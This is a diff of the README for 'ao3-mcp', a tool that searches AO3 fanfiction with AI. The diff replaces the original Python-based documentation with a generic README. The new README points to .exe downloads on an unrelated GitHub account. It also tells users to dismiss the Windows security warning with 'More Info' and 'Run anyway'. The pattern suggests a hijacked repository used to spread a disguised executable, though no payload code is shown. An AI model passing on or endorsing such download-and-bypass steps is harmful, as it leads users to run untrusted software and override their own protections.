@@ -1,144 +1,65 @@
-# ao3-mcp
+# 📚 ao3-mcp - Find and rank fanfiction using AI
 
-<!-- mcp-name: io.github.ArturLys/ao3-mcp -->
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/huntleeouter514/ao3-mcp/releases)
 
-![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)
-![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)
+This application helps you interact with Archive of Our Own. It uses artificial intelligence to search through fanfiction. You can ask the AI to read specific stories and provide rankings. This tool saves you time so you find stories that match your interests.
 
-An [MCP](https://modelcontextprotocol.io/) (Model Context Protocol) server that connects AI agents — Claude, Cursor, or any MCP client — to the [Archive of Our Own](https://archiveofourown.org/). Search AO3 fanfiction with full filters, resolve fuzzy wording to canonical tags, and get fics *actually read* before they're recommended.
+## 🛠️ System Requirements
 
-The trick: your agent never reads fic text. It delegates reading to a cheap secondary model (Gemini), which digests whole fics — even 150k-word novels — and returns structured reports. Your agent's context stays clean; the recommendations are based on the real text, not the blurb.
+You need a computer running Windows 10 or Windows 11. Your computer should have at least 4 gigabytes of RAM. You need an active internet connection to search for fanfiction and to send data to the AI.
 
-```
-agent ──MCP──> server.py
-                 ├─ ao3.py     AO3 scraping (no public API exists) — throttled and polite
-                 └─ reader.py  Gemini reads the fics, reports back: plot, style,
-                               prose samples, content notes, a ranking
-```
+## 📥 How to download the software
 
-## Why this beats blurb-based recommendations
+Follow these steps to get the application.
 
-An AO3 blurb is an ad written by the author. This server's workflow is: search wide (40–60 results), have the reader model read the shortlist — up to 20 full fics in one call — and recommend only what was actually read, with verbatim prose samples so quality is judged from the text itself.
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/huntleeouter514/ao3-mcp/releases).
+3. Look for the section labeled Assets.
+4. Click the file that ends in .exe.
+5. Save the file to your desktop or downloads folder.
 
-## Install
+## ⚙️ Setting up the application
 
-Requires **Python 3.10+** and a free **Gemini API key**:
+1. Open the folder where you saved the file.
+2. Double-click the file to start the installer.
+3. Windows might show a security window. This is normal.
+4. Click More Info followed by Run anyway if the window appears.
+5. Follow the prompts on the screen to finish the installation.
+6. The setup process creates a shortcut on your desktop.
 
-> Go to [aistudio.google.com/api-keys](https://aistudio.google.com/api-keys), sign in with any Google account, and click **"Create API key"**. The free tier is enough — no billing setup needed.
+## 🚀 Running the program
 
-```bash
-pip install ao3-mcp
-```
+Double-click the ao3-mcp icon on your desktop. A small window appears. This window shows the status of the connection. Keep this window open while you use the AI features.
 
-## Add to your agent
+## 🔍 How to search for stories
 
-Point `command` at `ao3-mcp` and pass your key with `--api-key`:
+1. Open the interface provided by your AI tool.
+2. Type your search terms into the prompt area.
+3. Include keywords like "AO3" or "fanfiction" so the system knows what to find.
+4. The tool connects to the archive.
+5. You see a list of stories based on your request.
+6. You can ask for a summary to learn more about a story.
 
-```json
-{
-  "mcpServers": {
-    "ao3": {
-      "command": "ao3-mcp",
-      "args": ["--api-key", "YOUR_GEMINI_KEY"]
-    }
-  }
-}
-```
+## 📊 Using the ranking feature
 
-Prefer to keep the key out of the args list? Drop `--api-key` and pass it in an `env`
-block instead — the server reads `GEMINI_API_KEY` from the environment as a fallback:
+The AI tool can read stories you select. Ask the AI to compare multiple works. You can request a ranking based on character development, plot pacing, or writing style. Provide a list of links or titles to start the process. The AI analyzes the text and gives you a list with explanations.
 
-```json
-"env": { "GEMINI_API_KEY": "YOUR_GEMINI_KEY" }
-```
+## 💡 Common troubleshooting tips
 
-<details>
-<summary>Claude Code</summary>
+If the software does not work, try these steps:
 
-```bash
-claude mcp add ao3 -- ao3-mcp --api-key YOUR_GEMINI_KEY
-```
+- Check your internet connection. The tool needs to reach the Archive of Our Own website.
+- Close other programs that use large amounts of memory.
+- Restart your computer. This clears temporary errors.
+- Ensure that you have the latest version of the program. Visit the download page again to check for updates.
+- If the AI returns an error, wait a few minutes and try your search again. Large requests take more time to process.
 
-</details>
+## 🛡️ Privacy and safety
 
-<details>
-<summary>Cursor</summary>
+This tool accesses information from the web to help you find stories. It does not save your password for Archive of Our Own. All communications happen through your chosen AI client. Review the terms of service for your AI provider if you have concerns about how they store information.
 
-`Cursor Settings` → `MCP` → `New MCP Server`, paste the JSON config above.
+## 📝 Tips for better results
 
-</details>
+Be specific in your requests. If you like stories with certain tropes, include those words. If you prefer long stories, ask for works with a high word count. You can also tell the AI to ignore specific tags that you do not enjoy reading. This makes the search results more relevant to your taste. 
 
-<details>
-<summary>Google Antigravity</summary>
-
-Add the JSON config above to `.gemini/antigravity/mcp_config.json`.
-
-</details>
-
-<details>
-<summary>VS Code / Copilot</summary>
-
-```bash
-code --add-mcp '{"name":"ao3","command":"ao3-mcp","args":["--api-key","YOUR_GEMINI_KEY"]}'
-```
-
-</details>
-
-Then just ask:
-
-```
-Find me a completed enemies-to-lovers longfic in <fandom>, read the top candidates, and tell me which is best written.
-```
-
-### Launch params
-
-| Param             | Env var               | Default              | What it does                                  |
-| ----------------- | --------------------- | -------------------- | --------------------------------------------- |
-| `--api-key`       | `GEMINI_API_KEY`      | —                    | Gemini API key (required).                     |
-| `--model`         | `GEMINI_MODEL`        | `gemini-flash-latest`| Model the reader uses.                          |
-| `--backup-model`  | `GEMINI_MODEL_BACKUP` | `gemini-flash-lite-latest` | Fallback model when the main one is throttled. |
-| `--min-interval`  | `AO3_MIN_INTERVAL`    | `0.6`                | Minimum seconds between AO3 requests.           |
-
-## Tools
-
-| Tool           | What it does                                                                 |
-| -------------- | ---------------------------------------------------------------------------- |
-| `search_works` | Search AO3: fandom, ship, character, tags, rating, word count, completion, sorting. 20 results/page, up to 5 pages per call. The `query` field supports AO3's full search-operator syntax (`words>10000`, `kudos>500`, `sort:kudos`, …). |
-| `find_tags`    | Live autocomplete — fuzzy wording → canonical AO3 tag, fandom, ship, or character names. |
-| `get_work`     | Full metadata card for one work: tags, stats, summary, series info.          |
-| `read_works`   | Reads 1–20 full fics with the secondary model and returns a structured report per fic — plot, characters, style, verbatim prose samples, content notes — plus a comparison ranking them against your question. |
-
-Fic downloads are cached locally for 24h, so re-reading a fic with a new question costs no AO3 requests.
-
-## Good to know
-
-- **AO3 has no API** — this scrapes its (clean) HTML, one request at a time, throttled to one every **0.6s** by default (tune with `--min-interval`) and honoring `Retry-After`. AO3 is volunteer-run; the politeness is deliberate.
-- **Cloudflare:** AO3 blocks plain HTTP clients. This uses `curl_cffi` with a mobile-Safari TLS fingerprint, which passes as of writing. If requests start failing with 403 + `cf-mitigated: challenge`, change `IMPERSONATE` in `ao3.py`.
-- **Privacy:** fic text goes to Google's Gemini API for reading; nothing else leaves your machine, no telemetry.
-- **Adult content:** AO3 hosts works across all ratings. The server passes through whatever your search scopes — use the `rating` filter and AO3's warning tags to control what gets fetched.
-
-## Make it yours
-
-It's a small, single-purpose server — a few hundred readable lines with no framework magic. Fork it and edit anything: rewrite the reader's prompt, swap in a different model, change the throttle, add a tool. That's the intended way to use it.
-
-Run it from source:
-
-```bash
-git clone https://github.com/ArturLys/ao3-mcp.git
-cd ao3-mcp
-python -m venv .venv
-source .venv/bin/activate        # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-
-python smoke_test.py YOUR_GEMINI_KEY   # end-to-end check: search → download → digest
-python server.py --api-key YOUR_GEMINI_KEY   # or point your client's command at this
-```
-
-## Credits
-
-- AO3 access approach builds on [ao3_api](https://github.com/wendytg/ao3_api) by wendytg.
-- All fanworks belong to their authors on the [Archive of Our Own](https://archiveofourown.org/), a project of the [Organization for Transformative Works](https://www.transformativeworks.org/).
-
-## License
-
-MIT
+Keywords: ai-tools, ao3, archive-of-our-own, claude, claude-code, fandom, fanfic, fanfiction, gemini, mcp, mcp-server, model-context-protocol
